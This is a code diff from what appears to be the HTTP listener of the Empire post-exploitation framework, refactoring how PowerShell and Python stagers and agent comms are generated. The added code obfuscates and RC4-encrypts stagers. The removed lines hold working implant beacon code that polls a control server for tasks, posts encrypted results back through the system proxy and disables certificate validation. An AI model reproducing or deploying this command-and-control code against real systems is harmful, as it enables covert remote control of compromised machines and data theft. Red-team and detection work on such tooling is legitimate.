@@ -7,7 +7,7 @@ import random
 from builtins import object, str
 from typing import List
 
-from empire.server.common import encryption, helpers, packets
+from empire.server.common import encryption, helpers, packets, templating
 from empire.server.database import models
 from empire.server.database.base import Session
 from empire.server.utils import data_util, listener_util
@@ -398,7 +398,9 @@ class Listener(object):
                 if not compiler.status == "ON":
                     print(helpers.color("[!] csharpserver plugin not running"))
                 else:
-                    file_name = compiler.do_send_stager(stager_yaml, "Sharpire")
+                    file_name = compiler.do_send_stager(
+                        stager_yaml, "Sharpire", confuse=obfuscate
+                    )
                     return file_name
 
             else:
@@ -450,46 +452,48 @@ class Listener(object):
         stage2 = random.choice(uris)
 
         if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
 
-            # read in the stager base
-            with open(
-                "%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath)
-            ) as f:
-                stager = f.read()
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/http.ps1")
+
+            template_options = {
+                "working_hours": workingHours,
+                "kill_date": killDate,
+                "staging_key": stagingKey,
+                "profile": profile,
+                "session_cookie": self.session_cookie,
+                "host": host,
+                "stage_1": stage1,
+                "stage_2": stage2,
+            }
+            stager = template.render(template_options)
+
             # Get the random function name generated at install and patch the stager with the proper function name
             stager = data_util.keyword_obfuscation(stager)
+
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
 
             # Patch in custom Headers
+            remove = []
             if customHeaders != []:
-                headers = ",".join(customHeaders)
+                for key in customHeaders:
+                    value = key.split(":")
+                    if "cookie" in value[0].lower() and value[1]:
+                        continue
+                    remove += value
+                headers = ",".join(remove)
                 stager = stager.replace(
-                    '$customHeaders = "";', '$customHeaders = "' + headers + '";'
+                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                 )
 
-            # patch in working hours, if any
-            if workingHours != "":
-                stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)
-
-            # Patch in the killdate, if any
-            if killDate != "":
-                stager = stager.replace("REPLACE_KILLDATE", killDate)
-
-            # patch the server and key information
-            stager = stager.replace("REPLACE_SERVER", host)
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("index.jsp", stage1)
-            stager = stager.replace("index.php", stage2)
-
-            unobfuscated_stager = ""
-
-            for line in stager.split("\n"):
-                line = line.strip()
-                # skip commented line
-                if not line.startswith("#"):
-                    unobfuscated_stager += line
+            stagingKey = stagingKey.encode("UTF-8")
+            unobfuscated_stager = listener_util.remove_lines_comments(stager)
 
             if obfuscate:
                 unobfuscated_stager = data_util.obfuscate(
@@ -504,34 +508,30 @@ class Listener(object):
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(RC4IV + stagingKey, unobfuscated_stager)
             else:
-                # otherwise just return the case-randomized stager
                 return unobfuscated_stager
 
         elif language.lower() == "python":
-            # read in the stager base
-            with open(
-                "%s/data/agent/stagers/http.py" % (self.mainMenu.installPath)
-            ) as f:
-                stager = f.read()
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
 
-            stager = helpers.strip_python_comments(stager)
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/http.py")
 
-            if host.endswith("/"):
-                host = host[0:-1]
+            template_options = {
+                "working_hours": workingHours,
+                "kill_date": killDate,
+                "staging_key": stagingKey,
+                "profile": profile,
+                "session_cookie": self.session_cookie,
+                "host": host,
+                "stage_1": stage1,
+                "stage_2": stage2,
+            }
+            stager = template.render(template_options)
 
-            if workingHours != "":
-                stager = stager.replace("SET_WORKINGHOURS", workingHours)
-
-            if killDate != "":
-                stager = stager.replace("SET_KILLDATE", killDate)
-
-            # # patch the server and key information
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("REPLACE_PROFILE", profile)
-            stager = stager.replace("index.jsp", stage1)
-            stager = stager.replace("index.php", stage2)
-
-            # # base64 encode the stager and return it
+            # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
             if encrypt:
@@ -584,11 +584,6 @@ class Listener(object):
                 code = f.read()
             # Get the random function name generated at install and patch the stager with the proper function name
             code = data_util.keyword_obfuscation(code)
-            # patch in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -626,12 +621,6 @@ class Listener(object):
                 f = open(self.mainMenu.installPath + "/data/agent/agent.py")
             code = f.read()
             f.close()
-
-            # patch in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
 
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
@@ -676,165 +665,41 @@ class Listener(object):
 
         This should be implemented for the module.
         """
+        host = listenerOptions["Host"]["Value"]
 
         if language:
             if language.lower() == "powershell":
+                template_path = [
+                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                ]
 
-                updateServers = """
-                    $Script:ControlServers = @("%s");
-                    $Script:ServerIndex = 0;
-                """ % (
-                    listenerOptions["Host"]["Value"]
-                )
+                eng = templating.TemplateEngine(template_path)
+                template = eng.get_template("http/http.ps1")
 
-                if listenerOptions["Host"]["Value"].startswith("https"):
-                    updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+                template_options = {
+                    "session_cookie": self.session_cookie,
+                    "host": host,
+                }
 
-                getTask = """
-                    function script:Get-Task {
-
-                        try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
-
-                                # meta 'TASKING_REQUEST' : 4
-                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
-                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-
-                                # build the web request object
-                                $wc = New-Object System.Net.WebClient
-
-                                # set the proxy settings for the WC to be the default system settings
-                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $wc.Proxy = $Script:Proxy;
-                                }
-
-                                $wc.Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
-                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")
-
-                                # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
-                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
-                                $result
-                            }
-                        }
-                        catch [Net.WebException] {
-                            $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                                # restart key negotiation
-                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
-                """
-
-                sendMessage = """
-                    function script:Send-Message {
-                        param($Packets)
-
-                        if($Packets) {
-                            # build and encrypt the response packet
-                            $EncBytes = Encrypt-Bytes $Packets
-
-                            # build the top level RC4 "routing packet"
-                            # meta 'RESULT_POST' : 5
-                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
-
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
-                                # build the web request object
-                                $wc = New-Object System.Net.WebClient
-                                # set the proxy settings for the WC to be the default system settings
-                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $wc.Proxy = $Script:Proxy;
-                                }
-
-                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
-
-                                try {
-                                    # get a random posting URI
-                                    $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
-                                }
-                                catch [System.Net.WebException]{
-                                    # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                                        # restart key negotiation
-                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
-                """
-
-                return updateServers + getTask + sendMessage
+                comms = template.render(template_options)
+                return comms
 
             elif language.lower() == "python":
+                template_path = [
+                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                ]
+                eng = templating.TemplateEngine(template_path)
+                template = eng.get_template("http/comms.py")
 
-                updateServers = "server = '%s'\n" % (listenerOptions["Host"]["Value"])
+                template_options = {
+                    "session_cookie": self.session_cookie,
+                    "host": host,
+                }
 
-                if listenerOptions["Host"]["Value"].startswith("https"):
-                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
-
-                # Import sockschain code
-                f = open(
-                    self.mainMenu.installPath
-                    + "/data/agent/stagers/common/sockschain.py"
-                )
-                socks_import = f.read()
-                f.close()
-
-                sendMessage = f"""
-def send_message(packets=None):
-    # Requests a tasking or posts data to a randomized tasking URI.
-    # If packets == None, the agent GETs a tasking from the control server.
-    # If packets != None, the agent encrypts the passed packets and
-    #    POSTs the data to the control server.
-    global missedCheckins
-    global server
-    global headers
-    global taskURIs
-    data = None
-    if packets:
-        # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, packets)
-        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-
-    else:
-        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
-        #   meta TASKING_REQUEST = 4
-        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
-        headers['Cookie'] = "{self.session_cookie}session=%s" % (b64routingPacket)
-    taskURI = random.sample(taskURIs, 1)[0]
-    requestUri = server + taskURI
-
-    try:
-        wrapmodule(urllib.request)
-        data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
-        return ('200', data)
-
-    except urllib.request.HTTPError as HTTPError:
-        # if the server is reached, but returns an error (like 404)
-        missedCheckins = missedCheckins + 1
-        #if signaled for restaging, exit.
-        if HTTPError.code == 401:
-            sys.exit(0)
-
-        return (HTTPError.code, '')
-
-    except urllib.request.URLError as URLerror:
-        # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
-        return (URLerror.reason, '')
-    return ('', '')
-"""
-                return socks_import + updateServers + sendMessage
+                comms = template.render(template_options)
+                return comms
 
             else:
                 print(
